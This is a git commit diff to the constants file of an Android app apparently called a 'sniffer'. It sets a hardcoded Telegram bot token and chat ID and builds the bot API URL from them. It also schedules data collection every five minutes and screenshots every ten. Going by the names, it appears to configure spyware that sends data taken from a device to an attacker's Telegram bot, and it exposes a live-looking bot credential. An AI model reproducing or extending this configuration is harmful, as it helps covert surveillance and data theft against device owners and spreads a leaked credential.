fa98e8e539cca6f1712768d54686c674ee7049d5
safetyIraq <paidhydr@gmail.com>
2026-03-17 11:02:12 +0300

    Update Constants.java

--- app/src/main/java/com/v8/global/sniffer/utils/Constants.java
+++ app/src/main/java/com/v8/global/sniffer/utils/Constants.java
@@ -1,17 +1,12 @@
 package com.v8.global.sniffer.utils;
 
 public class Constants {
-    // تيليغرام
-    public static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+    // 🔐 توكن البوت - غير هذا برجاءاً
+    public static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     public static final String CHAT_ID = "7259620384";
-    public static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
+    public static final String BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
     
-    // معرفات الإشعارات
-    public static final int NOTIFICATION_ID_COLLECTOR = 1001;
-    public static final int NOTIFICATION_ID_GUARDIAN = 1002;
-    
-    // فترات الجمع (بالمللي ثانية)
-    public static final long INITIAL_DELAY = 10000; // 10 ثواني
-    public static final long COLLECTION_INTERVAL = 300000; // 5 دقائق
-    public static final long PERMISSION_CHECK_INTERVAL = 30000; // 30 ثانية
+    // فترات الجمع
+    public static final long COLLECT_INTERVAL = 5 * 60 * 1000; // 5 دقائق
+    public static final long SCREENSHOT_INTERVAL = 10 * 60 * 1000; // 10 دقائق
 }
